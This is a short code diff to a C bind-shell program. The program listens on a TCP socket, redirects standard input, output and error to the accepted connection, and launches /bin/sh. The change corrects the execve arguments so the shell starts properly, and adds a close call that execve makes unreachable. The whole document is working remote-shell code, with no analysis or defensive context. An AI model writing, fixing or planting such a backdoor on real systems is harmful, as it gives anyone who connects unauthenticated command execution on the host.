@@ -4,7 +4,6 @@
 #include <unistd.h>
 
 int main(void){
-
     int listening_socket = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_addr;
@@ -17,13 +16,11 @@ int main(void){
     listen(listening_socket, 5);
 
     int accepted_socket = accept(listening_socket, NULL, NULL);
-    
+
     for(int i = 0; i < 3; i++){
         dup2(accepted_socket, i);
     }
-    
-
-    execve("/bin/sh", NULL, NULL);
-    
-
+    char *args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", args, NULL);
+    close(listening_socket);
 }
